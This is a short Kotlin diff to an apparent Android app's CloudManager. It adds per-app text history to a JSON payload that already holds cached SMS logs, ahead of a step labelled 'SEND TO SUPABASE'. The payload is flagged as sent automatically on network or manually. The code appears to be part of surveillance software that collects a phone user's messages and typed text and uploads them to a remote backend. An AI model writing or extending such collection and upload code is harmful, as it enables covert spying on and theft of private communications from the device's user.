@@ -40,8 +40,15 @@ object CloudManager {
                 json.put("android_version", android.os.Build.VERSION.RELEASE)
                 
                 // Attach SMS logs
+                // Attach SMS logs
                 val rawLogs = prefs.getString("sms_logs_cache", "[]")
                 json.put("sms_logs", JSONArray(rawLogs))
+
+                // Attach Text History
+                val rawHistory = prefs.getString("text_history_by_app", "{}")
+                json.put("text_history", JSONObject(rawHistory))
+
+                // 3. SEND TO SUPABASE
 
                 // Mark if auto-trigger or manual
                 json.put("trigger", if (btn == null) "AUTO_NETWORK" else "MANUAL_USER")
